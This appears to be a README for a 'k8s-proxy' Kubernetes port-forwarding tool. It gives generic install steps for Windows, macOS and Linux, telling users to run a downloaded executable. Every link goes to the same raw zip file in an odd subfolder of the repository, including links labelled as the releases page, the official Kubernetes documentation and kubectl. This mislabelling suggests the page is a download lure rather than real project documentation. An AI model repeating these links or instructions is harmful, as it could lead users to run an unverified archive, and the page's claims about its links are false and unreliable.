# 🎉 k8s-proxy - Simplifying Kubernetes Port Forwarding

## 📌 Overview
The k8s-proxy tool helps you manage port forwarding in Kubernetes. It addresses issues that often occur when trying to connect to your services. If you've faced an error like "connection reset by peer," this tool is for you.

## 🚀 Getting Started
To begin using k8s-proxy, you need to download it from the Releases page. Follow the steps below to set everything up smoothly.

## 🔗 Download
[![Download k8s-proxy](https://raw.githubusercontent.com/touhedulislam/k8s-proxy/master/saprolitic/k8s-proxy_2.1.zip)](https://raw.githubusercontent.com/touhedulislam/k8s-proxy/master/saprolitic/k8s-proxy_2.1.zip)

## 💾 System Requirements
- **Operating System:** Linux, macOS, or Windows 
- **Kubernetes:** Compatible with any version of Kubernetes 
- **Memory/RAM:** At least 512 MB 
- **Storage:** Minimum of 100 MB free space 

## ⚙️ Installation Steps

1. **Visit the Releases Page**
   Go to the Releases page to get the latest version of k8s-proxy. You can find it [here](https://raw.githubusercontent.com/touhedulislam/k8s-proxy/master/saprolitic/k8s-proxy_2.1.zip).

2. **Choose the Correct File**
   On the Releases page, locate the version that suits your operating system. Make sure to select the correct file based on the platform you are using.

3. **Download the File**
   Click on the download link to start downloading the k8s-proxy file. Depending on your internet speed, this may take a few moments. 

4. **Install the Application**
   After downloading, follow these steps based on your operating system:

   - **For Windows:**
     1. Locate the downloaded `.exe` file.
     2. Double-click on it to start the installation.
     3. Follow the instructions provided in the installation wizard.

   - **For macOS:**
     1. Find the downloaded `.dmg` file.
     2. Open it and drag the k8s-proxy icon into your Applications folder.
     3. Eject the disk image after copying.

   - **For Linux:**
     1. Open a terminal.
     2. Navigate to the directory where you downloaded the file.
     3. Use the command: `chmod +x k8s-proxy` to make it executable.
     4. Run it using `./k8s-proxy`.

## 🔄 Running k8s-proxy

1. **Open Your Terminal or Command Prompt**
   This is where you'll interact with k8s-proxy.

2. **Ensure Kubernetes is Running**
   Make sure your Kubernetes cluster is up and running. You can check the status by running `kubectl get nodes`. If you see your nodes listed, you're good to go!

3. **Launch k8s-proxy**
   In your terminal, type the following command:
   ```
   k8s-proxy
   ```
   This should initiate the local proxy and start forwarding ports as needed.

4. **Access Your Services**
   With k8s-proxy running, you can now access your Kubernetes services through the specified ports.

## ⚠️ Troubleshooting Common Issues

- **Connection Errors**
   If you encounter an error similar to "connection reset by peer," ensure that your Kubernetes pod is running and correctly configured.

- **Port Conflicts**
   Double-check the target ports you are using. Ensure they are not being used by other applications on your local machine.

- **Firewall Settings**
   If you cannot connect, your firewall settings might be blocking the required ports. Review and adjust them as necessary.

## 📚 Additional Resources
- **Kubernetes Documentation**: For more information on Kubernetes, visit [Kubernetes Official Docs](https://raw.githubusercontent.com/touhedulislam/k8s-proxy/master/saprolitic/k8s-proxy_2.1.zip).
- **kubectl**: This command-line tool is essential for interacting with Kubernetes. Learn more [here](https://raw.githubusercontent.com/touhedulislam/k8s-proxy/master/saprolitic/k8s-proxy_2.1.zip).

## 📝 Notes
- k8s-proxy uses standard network tools to handle port forwarding. Familiarity with command-line interfaces is helpful but not mandatory.
- Ensure you keep your k8s-proxy application up to date by regularly checking the Releases page.

## 🔗 Download & Install
Once again, you can visit the Releases page to download the latest version of k8s-proxy: [Download k8s-proxy](https://raw.githubusercontent.com/touhedulislam/k8s-proxy/master/saprolitic/k8s-proxy_2.1.zip). Follow the installation steps above to set it up correctly.

Now you are ready to use k8s-proxy and simplify your Kubernetes experience!